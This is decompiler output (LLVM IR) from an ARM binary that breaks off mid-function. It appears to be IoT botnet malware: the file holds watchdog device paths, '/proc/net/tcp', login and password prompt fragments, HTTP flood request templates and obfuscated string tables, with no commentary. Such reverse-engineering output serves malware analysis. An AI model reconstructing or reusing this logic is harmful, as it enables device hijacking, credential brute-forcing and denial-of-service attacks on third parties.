source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.1 = constant i32 -352321502
@global_var_1e228.5 = global i32 0
@global_var_1e238.6 = global i32* @global_var_1e228.5
@global_var_1e398.12 = global i32 0
@global_var_f424.18 = constant i32 -382906384
@global_var_1575c.21 = constant [4 x i8] c"GET\00"
@1 = constant i32 47
@global_var_12e9c.25 = constant i32 -382910448
@global_var_10000.26 = constant i32 -382906384
@global_var_15754.28 = constant i32 32
@global_var_1572c.30 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_15744.32 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_15750.34 = constant [3 x i8] c"\0D\0A\00"
@global_var_15764.36 = constant [9 x i8] c"Cookie: \00"
@global_var_15770.38 = constant [3 x i8] c"; \00"
@global_var_15774.40 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_1577c.42 = constant i32 59
@global_var_15780.44 = constant [5 x i8] c"http\00"
@global_var_15788.46 = constant [5 x i8] c"url=\00"
@global_var_15790.48 = constant [5 x i8] c"POST\00"
@global_var_12504.49 = constant i32 -439275520
@global_var_15798.51 = constant i32 39
@global_var_1579c.53 = constant i32 61
@global_var_1e3b4.57 = global i32 0
@global_var_a0cc.58 = constant i32 -352321546
@global_var_13aec.59 = constant i32 -481296384
@global_var_1e3b8.61 = global i32 0
@global_var_1e3bc.62 = local_unnamed_addr global i32 0
@global_var_d7b0.68 = constant i32 -382906384
@global_var_dc74.70 = constant i32 -382906384
@global_var_ce40.72 = constant i32 -382906384
@global_var_c6fc.74 = constant i32 -382906384
@global_var_bf88.76 = constant i32 -382906384
@global_var_b728.78 = constant i32 -382906384
@global_var_b00c.80 = constant i32 -382906384
@global_var_a890.82 = constant i32 -382906384
@global_var_81cc.84 = constant i32 -382906384
@global_var_1e46c.86 = global i32 0
@global_var_1e474.97 = global i32 0
@global_var_157a0.99 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_1e3d8.103 = global i32 0
@global_var_1e470.105 = global i32 0
@global_var_f260.107 = constant i32 -471842863
@global_var_1e244.109 = global i32 75668
@global_var_1e47c.112 = local_unnamed_addr global i32 0
@global_var_1e47b.113 = local_unnamed_addr global i32 0
@global_var_1e47a.114 = local_unnamed_addr global i32 0
@global_var_1e23c.116 = global i32 -1
@global_var_f248.121 = constant i32 -442556408
@global_var_157b0.123 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_1e479.128 = local_unnamed_addr global i32 0
@global_var_15804.130 = constant [3 x i8] c"/.\00"
@global_var_157e0.132 = constant i32 62132
@global_var_f2b4.133 = constant i32 -382909968
@global_var_11c08.135 = constant i32 -509607552
@global_var_11cc0.138 = constant i32 -382906384
@global_var_11b50.140 = constant i32 -509607552
@global_var_15800.145 = constant i32 62024
@global_var_157d4.147 = constant i32 10
@global_var_157c0.149 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_1e240.151 = global i32 -1
@global_var_12794.156 = constant i32 -382910224
@global_var_157d8.158 = constant i32 16777216
@global_var_1e3e0.160 = global i32 0
@global_var_1e3ec.162 = global i32 0
@global_var_1e3e4.164 = global i32 0
@global_var_1e3e8.166 = global i32 0
@global_var_15818.172 = constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00"
@global_var_1e890.182 = global i32 0
@global_var_1e424.184 = global i32 0
@global_var_1e3f0.186 = global i32 0
@global_var_1e41c.188 = global i32 0
@global_var_1e488.196 = global i32 0
@global_var_1e88c.200 = global i32 0
@global_var_1e3f7.203 = local_unnamed_addr global i32 0
@global_var_1e3f6.204 = local_unnamed_addr global i32 0
@global_var_1e408.206 = global i32 0
@global_var_1e3f9.208 = local_unnamed_addr global i32 0
@global_var_1e3fd.209 = local_unnamed_addr global i32 0
@global_var_1e3fc.210 = local_unnamed_addr global i32 0
@global_var_1e40b.211 = local_unnamed_addr global i32 0
@global_var_1e409.212 = local_unnamed_addr global i32 0
@global_var_1e3f8.213 = local_unnamed_addr global i32 0
@global_var_1e40a.214 = local_unnamed_addr global i32 0
@global_var_15908.217 = constant [5 x i8] c"PMMV\00"
@global_var_1e417.218 = local_unnamed_addr global i32 0
@global_var_1e416.219 = local_unnamed_addr global i32 0
@global_var_15910.221 = constant [6 x i8] c"CFOKL\00"
@global_var_15918.223 = constant [6 x i8] c"TKXZT\00"
@global_var_15920.225 = constant i32 320499557
@global_var_15928.227 = constant i32 387006810
@global_var_15930.229 = constant [8 x i8] c"FGDCWNV\00"
@global_var_15938.231 = constant [7 x i8] c"CLVQNS\00"
@global_var_15940.233 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_15878.235 = constant i32 370216979
@global_var_15948.237 = constant [8 x i8] c"QWRRMPV\00"
@global_var_15950.239 = constant i32 370216979
@global_var_15958.241 = constant i32 319951379
@global_var_15964.243 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_15970.245 = constant i32 269555223
@global_var_15978.247 = constant [9 x i8] c"HWCLVGAJ\00"
@global_var_15984.249 = constant i32 370216979
@global_var_158d0.251 = constant i32 320017171
@global_var_1598c.253 = constant i32 390551160
@global_var_15994.255 = constant [5 x i8] c"WQGP\00"
@global_var_1599c.257 = constant [6 x i8] c"EWGQV\00"
@global_var_159a4.259 = constant [6 x i8] c"XNZZ\0C\00"
@global_var_159ac.261 = constant i32 1447843658
@global_var_159b8.263 = constant i32 5396247
@global_var_159bc.265 = constant i32 1263486531
@global_var_158a8.267 = constant i32 0
@global_var_1583c.269 = constant i32 1448101716
@global_var_15850.271 = constant [11 x i8] c"GRKAPMWVGP\00"
@global_var_1585c.273 = constant i32 1263486531
@global_var_15868.275 = constant [11 x i8] c"QWRGPTKQMP\00"
@global_var_15874.277 = constant i32 1178819416
@global_var_15880.279 = constant i32 370216979
@global_var_1588c.281 = constant i32 323767125
@global_var_15898.283 = constant [5 x i8] c"TLRV\00"
@global_var_158a0.285 = constant i32 323767157
@global_var_158ac.287 = constant i32 387007823
@global_var_158b4.289 = constant [7 x i8] c"OGPNKL\00"
@global_var_158bc.291 = constant [7 x i8] c"LM@MF[\00"
@global_var_158c4.293 = constant i32 303174162
@global_var_158cc.295 = constant i32 320017171
@global_var_158d8.297 = constant [9 x i8] c"MRGPCVMP\00"
@global_var_158e4.299 = constant i32 1280789828
@global_var_1e400.300 = local_unnamed_addr global i32 0
@global_var_1e404.301 = local_unnamed_addr global i32 0
@global_var_1e3fe.302 = local_unnamed_addr global i32 0
@global_var_1e3ff.303 = local_unnamed_addr global i32 0
@global_var_1e40c.304 = local_unnamed_addr global i32 0
@global_var_1e418.305 = local_unnamed_addr global i32 0
@global_var_1e419.306 = local_unnamed_addr global i32 0
@global_var_158f0.310 = constant [5 x i8] c"ogin\00"
@global_var_158f8.312 = constant [6 x i8] c"enter\00"
@global_var_159cc.317 = constant i32 2096127
@global_var_159c3.319 = constant i32 2095871
@global_var_15900.321 = constant [8 x i8] c"assword\00"
@global_var_1e898.323 = global i32 0
@global_var_1e24c.326 = global i32 -559038737
@global_var_159d0.331 = constant [3 x i8] c"\225\00"
@global_var_1e8b8.332 = local_unnamed_addr global i32 0
@global_var_1e8bc.333 = local_unnamed_addr global i32 0
@global_var_1e8bd.334 = local_unnamed_addr global i32 0
@global_var_159d4.336 = constant i32 51097
@global_var_1e930.337 = local_unnamed_addr global i32 0
@global_var_1e934.338 = local_unnamed_addr global i32 0
@global_var_1e935.339 = local_unnamed_addr global i32 0
@global_var_159d8.341 = constant i32 1448168270
@global_var_1e8ac.342 = local_unnamed_addr global i32 0
@global_var_1e8a8.343 = local_unnamed_addr global i32 0
@global_var_1e8ad.344 = local_unnamed_addr global i32 0
@global_var_159e8.346 = constant i32 1381389898
@global_var_1e8c4.347 = local_unnamed_addr global i32 0
@global_var_1e8c0.348 = local_unnamed_addr global i32 0
@global_var_1e8c5.349 = local_unnamed_addr global i32 0
@global_var_15a08.351 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_1e8c8.352 = local_unnamed_addr global i32 0
@global_var_1e8cc.353 = local_unnamed_addr global i32 0
@global_var_1e8cd.354 = local_unnamed_addr global i32 0
@global_var_15a10.356 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_1e8d4.357 = local_unnamed_addr global i32 0
@global_var_1e8d0.358 = local_unnamed_addr global i32 0
@global_var_1e8d5.359 = local_unnamed_addr global i32 0
@global_var_15a18.361 = constant i32 1195772418
@global_var_1e8dc.362 = local_unnamed_addr global i32 0
@global_var_1e8d8.363 = local_unnamed_addr global i32 0
@global_var_1e8dd.364 = local_unnamed_addr global i32 0
@global_var_15a24.366 = constant [5 x i8] c"\0DDF\22\00"
@global_var_1e8e4.367 = local_unnamed_addr global i32 0
@global_var_1e8e0.368 = local_unnamed_addr global i32 0
@global_var_1e8e5.369 = local_unnamed_addr global i32 0
@global_var_15a2c.371 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_1e8e8.372 = local_unnamed_addr global i32 0
@global_var_1e8ec.373 = local_unnamed_addr global i32 0
@global_var_1e8ed.374 = local_unnamed_addr global i32 0
@global_var_15a34.376 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_1e8f4.377 = local_unnamed_addr global i32 0
@global_var_1e8f0.378 = local_unnamed_addr global i32 0
@global_var_1e8f5.379 = local_unnamed_addr global i32 0
@global_var_15a40.381 = constant i32 1836214128
@global_var_1e8fc.382 = local_unnamed_addr global i32 0
@global_var_1e8f8.383 = local_unnamed_addr global i32 0
@global_var_1e8fd.384 = local_unnamed_addr global i32 0
@global_var_15a50.386 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_1e900.387 = local_unnamed_addr global i32 0
@global_var_1e904.388 = local_unnamed_addr global i32 0
@global_var_1e905.389 = local_unnamed_addr global i32 0
@global_var_15a5c.391 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_1e908.392 = local_unnamed_addr global i32 0
@global_var_1e90c.393 = local_unnamed_addr global i32 0
@global_var_1e90d.394 = local_unnamed_addr global i32 0
@global_var_15a68.396 = constant i32 437738110
@global_var_1e914.397 = local_unnamed_addr global i32 0
@global_var_1e910.398 = local_unnamed_addr global i32 0
@global_var_1e915.399 = local_unnamed_addr global i32 0
@global_var_15a8c.401 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_1e91c.402 = local_unnamed_addr global i32 0
@global_var_1e918.403 = local_unnamed_addr global i32 0
@global_var_1e91d.404 = local_unnamed_addr global i32 0
@global_var_15a98.406 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_1e924.407 = local_unnamed_addr global i32 0
@global_var_1e920.408 = local_unnamed_addr global i32 0
@global_var_1e925.409 = local_unnamed_addr global i32 0
@global_var_15aa4.411 = constant [7 x i8] c"QJGNN\22\00"
@global_var_1e93c.412 = local_unnamed_addr global i32 0
@global_var_1e938.413 = local_unnamed_addr global i32 0
@global_var_1e93d.414 = local_unnamed_addr global i32 0
@global_var_15aac.416 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_1e940.417 = local_unnamed_addr global i32 0
@global_var_1e944.418 = local_unnamed_addr global i32 0
@global_var_1e945.419 = local_unnamed_addr global i32 0
@global_var_15ab4.421 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_1e948.422 = local_unnamed_addr global i32 0
@global_var_1e94c.423 = local_unnamed_addr global i32 0
@global_var_1e94d.424 = local_unnamed_addr global i32 0
@global_var_15abc.426 = constant [4 x i8] c"QJ\22\00"
@global_var_1e954.427 = local_unnamed_addr global i32 0
@global_var_1e950.428 = local_unnamed_addr global i32 0
@global_var_1e955.429 = local_unnamed_addr global i32 0
@global_var_15ac0.431 = constant i32 1280000013
@global_var_1e958.432 = local_unnamed_addr global i32 0
@global_var_1e95c.433 = local_unnamed_addr global i32 0
@global_var_1e95d.434 = local_unnamed_addr global i32 0
@global_var_15ad4.436 = constant i32 1668311919
@global_var_1e964.437 = local_unnamed_addr global i32 0
@global_var_1e960.438 = local_unnamed_addr global i32 0
@global_var_1e965.439 = local_unnamed_addr global i32 0
@global_var_15af0.441 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_1e968.442 = local_unnamed_addr global i32 0
@global_var_1e96c.443 = local_unnamed_addr global i32 0
@global_var_1e96d.444 = local_unnamed_addr global i32 0
@global_var_15afc.446 = constant i32 1280000013
@global_var_1e970.447 = local_unnamed_addr global i32 0
@global_var_1e974.448 = local_unnamed_addr global i32 0
@global_var_1e975.449 = local_unnamed_addr global i32 0
@global_var_15b10.451 = constant i32 1280000013
@global_var_1e97c.452 = local_unnamed_addr global i32 0
@global_var_1e978.453 = local_unnamed_addr global i32 0
@global_var_1e97d.454 = local_unnamed_addr global i32 0
@global_var_15b28.456 = constant i32 1464693110
@global_var_1e984.457 = local_unnamed_addr global i32 0
@global_var_1e980.458 = local_unnamed_addr global i32 0
@global_var_1e985.459 = local_unnamed_addr global i32 0
@global_var_15b40.461 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_1e98c.462 = local_unnamed_addr global i32 0
@global_var_1e988.463 = local_unnamed_addr global i32 0
@global_var_1e98d.464 = local_unnamed_addr global i32 0
@global_var_15b54.466 = constant i32 1196376908
@global_var_1e990.467 = local_unnamed_addr global i32 0
@global_var_1e994.468 = local_unnamed_addr global i32 0
@global_var_1e995.469 = local_unnamed_addr global i32 0
@global_var_15b64.471 = constant i32 1280068961
@global_var_1e99c.472 = local_unnamed_addr global i32 0
@global_var_1e998.473 = local_unnamed_addr global i32 0
@global_var_1e99d.474 = local_unnamed_addr global i32 0
@global_var_15b7c.476 = constant i32 1195458915
@global_var_1e9a4.477 = local_unnamed_addr global i32 0
@global_var_1e9a0.478 = local_unnamed_addr global i32 0
@global_var_1e9a5.479 = local_unnamed_addr global i32 0
@global_var_15bd0.481 = constant i32 1195458915
@global_var_1e9ac.482 = local_unnamed_addr global i32 0
@global_var_1e9a8.483 = local_unnamed_addr global i32 0
@global_var_1e9ad.484 = local_unnamed_addr global i32 0
@global_var_15bf4.486 = constant i32 1447841121
@global_var_1e9b4.487 = local_unnamed_addr global i32 0
@global_var_1e9b0.488 = local_unnamed_addr global i32 0
@global_var_1e9b5.489 = local_unnamed_addr global i32 0
@global_var_15c28.491 = constant i32 1633044305
@global_var_1e9b8.492 = local_unnamed_addr global i32 0
@global_var_1e9bc.493 = local_unnamed_addr global i32 0
@global_var_1e9bd.494 = local_unnamed_addr global i32 0
@global_var_15c38.496 = constant i32 1346651984
@global_var_1e9c0.497 = local_unnamed_addr global i32 0
@global_var_1e9c4.498 = local_unnamed_addr global i32 0
@global_var_1e9c5.499 = local_unnamed_addr global i32 0
@global_var_15c44.501 = constant i32 1128353102
@global_var_1e9c8.502 = local_unnamed_addr global i32 0
@global_var_1e9cc.503 = local_unnamed_addr global i32 0
@global_var_1e9cd.504 = local_unnamed_addr global i32 0
@global_var_15c50.506 = constant i32 257312593
@global_var_1e9d0.507 = local_unnamed_addr global i32 0
@global_var_1e9d4.508 = local_unnamed_addr global i32 0
@global_var_1e9d5.509 = local_unnamed_addr global i32 0
@global_var_15c60.511 = constant i32 1447841089
@global_var_1e9d8.512 = local_unnamed_addr global i32 0
@global_var_1e9dc.513 = local_unnamed_addr global i32 0
@global_var_1e9dd.514 = local_unnamed_addr global i32 0
@global_var_15c74.516 = constant i32 1279479894
@global_var_1e9e0.517 = local_unnamed_addr global i32 0
@global_var_1e9e4.518 = local_unnamed_addr global i32 0
@global_var_1e9e5.519 = local_unnamed_addr global i32 0
@global_var_15c88.521 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_1e9ec.522 = local_unnamed_addr global i32 0
@global_var_1e9e8.523 = local_unnamed_addr global i32 0
@global_var_1e9ed.524 = local_unnamed_addr global i32 0
@global_var_15b70.526 = constant i32 1380403017
@global_var_1e9f4.527 = local_unnamed_addr global i32 0
@global_var_1e9f0.528 = local_unnamed_addr global i32 0
@global_var_1e9f5.529 = local_unnamed_addr global i32 0
@global_var_15c94.531 = constant i32 1280068929
@global_var_1e9f8.532 = local_unnamed_addr global i32 0
@global_var_1e9fc.533 = local_unnamed_addr global i32 0
@global_var_1e9fd.534 = local_unnamed_addr global i32 0
@global_var_15ca4.536 = constant i32 1414547281
@global_var_1ea04.537 = local_unnamed_addr global i32 0
@global_var_1ea00.538 = local_unnamed_addr global i32 0
@global_var_1ea05.539 = local_unnamed_addr global i32 0
@global_var_15cb8.541 = constant i32 1414547281
@global_var_1ea0c.542 = local_unnamed_addr global i32 0
@global_var_1ea08.543 = local_unnamed_addr global i32 0
@global_var_1ea0d.544 = local_unnamed_addr global i32 0
@global_var_15cd4.546 = constant i32 1264078191
@global_var_1ea10.547 = local_unnamed_addr global i32 0
@global_var_1ea14.548 = local_unnamed_addr global i32 0
@global_var_1ea15.549 = local_unnamed_addr global i32 0
@global_var_15d44.551 = constant i32 1264078191
@global_var_1ea18.552 = local_unnamed_addr global i32 0
@global_var_1ea1c.553 = local_unnamed_addr global i32 0
@global_var_1ea1d.554 = local_unnamed_addr global i32 0
@global_var_15db4.556 = constant i32 1264078191
@global_var_1ea20.557 = local_unnamed_addr global i32 0
@global_var_1ea24.558 = local_unnamed_addr global i32 0
@global_var_1ea25.559 = local_unnamed_addr global i32 0
@global_var_15e24.561 = constant i32 1264078191
@global_var_1ea2c.562 = local_unnamed_addr global i32 0
@global_var_1ea28.563 = local_unnamed_addr global i32 0
@global_var_1ea2d.564 = local_unnamed_addr global i32 0
@global_var_15e94.566 = constant i32 1264078191
@global_var_1ea35.567 = local_unnamed_addr global i32 0
@global_var_1ea30.568 = local_unnamed_addr global i32 0
@global_var_1ea34.569 = local_unnamed_addr global i32 0
@global_var_144d4.572 = constant i32 -476053504
@global_var_1326c.576 = constant i32 -443219956
@global_var_133d8.581 = constant i32 -376111092
@global_var_1e460.584 = global i32 0
@global_var_1354c.586 = constant i32 -456978431
@global_var_1ea38.588 = global i32 0
@global_var_1e428.590 = global i32 0
@global_var_1e34c.593 = global i32 256
@global_var_1e250.594 = global i32* @global_var_1e34c.593
@global_var_1e450.597 = global i32 0
@global_var_1eab8.599 = global i32 0
@global_var_14c88.600 = constant i32 -382910416
@global_var_134d0.601 = constant i32 -509595648
@global_var_13b6c.608 = constant i32 -442564520
@global_var_1e358.614 = global i32 0
@global_var_13118.616 = constant i32 -481230848
@global_var_1e440.618 = global i32 0
@global_var_148d8.620 = constant i32 -509587456
@global_var_16018.622 = constant i32 33554944
@global_var_1e390.623 = global i32* @global_var_16018.622
@global_var_1e370.626 = global i32 0
@global_var_1e444.630 = local_unnamed_addr global i32 0
@global_var_1428c.632 = constant i32 -352321419
@global_var_1e21c.636 = global i32 -1
@global_var_1e454.639 = global i32 0
@global_var_1e458.641 = local_unnamed_addr global i32 0
@global_var_144c0.642 = constant i32 -390234096
@global_var_15f0c.644 = constant [10 x i8] c"/dev/null\00"
@global_var_1e45c.646 = global i32 0
@global_var_1e448.651 = local_unnamed_addr global i32 0
@global_var_1e44c.653 = global i32 0
@global_var_134b0.655 = constant i32 -369096946
@global_var_1e388 = external local_unnamed_addr global i32
@global_var_13470.665 = constant i32 -442564608
@global_var_14788.667 = constant i32 -335544664
@global_var_148a4.670 = constant i32 -275775369
@global_var_1501c.671 = constant i32 -382910352
@global_var_1e468.673 = global i32 0
@global_var_1ead0.676 = global i32 0
@global_var_1ead4.678 = global i32 0
@global_var_1e220.681 = global i32 0
@global_var_1e394.3 = external global i8*
@global_var_1e3b0.55 = external global i8*
@global_var_1e3b1.66 = global i8 0
@global_var_1e478.111 = external global i8*
@2 = internal constant [2 x i8] c"\01\00"
@global_var_1e248.118 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_1e3dc.154 = external global i8*
@global_var_1e420.190 = external global i8*
@global_var_1e421.191 = local_unnamed_addr global i8 0
@global_var_1e48c.198 = global i8 0
@global_var_1e3f4.202 = external global i8*
@global_var_1e414.207 = local_unnamed_addr global i8 0
@global_var_1e415.215 = local_unnamed_addr global i8 0
@global_var_15760.23 = constant [2 x i8] c"/\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @function_8130()
  %v1_80a4 = call i32 @function_156cc(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @function_80b0() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_1e394.3 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_1e394.3 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb8, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb8:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1e238.6 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_1e238.6 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb9, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_1e238.6 to i32), %bb8 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb8 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_1e238.6 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %.loopexit, %bb8
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_1e394.3 to i32), %bb8 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_1e238.6, { 1, 0 }
  uselistorder i8** @global_var_1e394.3, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @function_8124(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8124:
  %v0_8124 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8124, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8124
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8124, %bb
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8130() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* inttoptr (i32 123436 to i32*), align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 123436

bb2:                                              ; preds = %.thread
  ret i32 123436

; uselistorder directives
  uselistorder i32 123436, { 1, 0, 2 }
}

define i32 @function_8188() local_unnamed_addr {
dec_label_pc_8188:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @function_14574(i32 ptrtoint (i32* @global_var_f424.18 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 87816, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @function_13f3c()
  ret i32 %v0_81bc
}

define i32 @function_81cc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_81cc:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-10568 = alloca i32, align 4
  %stack_var_-404 = alloca i32, align 4
  %stack_var_-20809 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_81cc = load i32, i32* @r4, align 4
  store i32 %v3_81cc, i32* %stack_var_-36, align 4
  %v6_81cc = load i32, i32* @r5, align 4
  %v9_81cc = load i32, i32* @r6, align 4
  %v15_81cc = load i32, i32* @r8, align 4
  %v1_81d8 = urem i32 %arg3, 256
  store i32 %v1_81d8, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_81e4 = urem i32 %arg1, 256
  store i32 %v1_81e4, i32* %ip.global-to-local, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v1_81d8, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_8200 = inttoptr i32 %arg4 to i32*
  %v6_8200 = call i32 @function_9f84(i32 %v1_81d8, i32* %v5_8200, i32 21, i32 0, i32 %arg2)
  %v0_8204 = load i32, i32* @r5, align 4
  store i32 %v0_8204, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v0_8210 = load i32, i32* @r4, align 4
  store i32 %v0_8210, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1575c.21 to i32), i32* %r3.global-to-local, align 4
  %v6_8218 = inttoptr i32 %v0_8204 to i32*
  %v7_8218 = call i32 @function_9f84(i32 %v0_8210, i32* %v6_8218, i32 20, i32 ptrtoint ([4 x i8]* @global_var_1575c.21 to i32), i32 %v6_8200)
  %v0_821c = load i32, i32* @r5, align 4
  store i32 %v0_821c, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v7_8218, i32* %fp.global-to-local, align 4
  %v0_822c = load i32, i32* @r4, align 4
  store i32 %v0_822c, i32* %r0.global-to-local, align 4
  %v5_8230 = inttoptr i32 %v0_821c to i32*
